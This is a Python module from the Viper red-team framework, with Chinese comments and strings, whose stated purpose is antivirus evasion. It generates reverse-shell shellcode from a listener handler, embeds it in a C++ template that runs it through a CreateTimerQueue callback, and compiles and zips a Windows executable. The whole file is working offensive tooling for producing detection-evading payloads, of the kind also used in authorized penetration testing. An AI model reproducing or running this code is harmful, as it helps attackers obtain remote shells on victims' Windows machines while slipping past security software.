# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


import time

from Lib.ModuleAPI import *


class PostModule(PostPythonModule):
    NAME = "Callback免杀(CreateTimerQueue)"
    DESC = "模块通过编码shellcode与CreateTimerQueue Callback结合的方式实现免杀"
    MODULETYPE = TAG2CH.Execution
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/pf9ko7"]
    REFERENCES = ["https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumwindows"]
    AUTHOR = "Viper"

    OPTIONS = register_options([
        OptionHander(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        payload = self.get_handler_payload()
        if "windows" not in payload:
            return False, "模块只支持windows类型载荷"
        return True, None

    def run(self):
        shellcode = self.generate_hex_reverse_shellcode_by_handler()
        source_code = self.generate_context_by_template(filename="main.cpp", SHELLCODE_STR=shellcode)
        mingw = Mingw(include_dir=self.module_data_dir, source_code=source_code)
        payload = self.get_handler_payload()
        if "x64" not in payload:
            arch = "x86"
        else:
            arch = "x64"
        binbytes = mingw.compile(arch=arch)

        exefilename = f"CallbackCreateTimerQueue_{int(time.time())}.exe"
        projectfilename = f"CallbackCreateTimerQueue_{int(time.time())}.zip"
        self.write_zip_vs_project(filename=projectfilename, source_code=source_code, exe_file=exefilename,
                                  exe_data=binbytes)

        self.log_good("模块执行成功")
        self.log_good(f"请在<文件列表>中查看生成的zip文件: {projectfilename}")
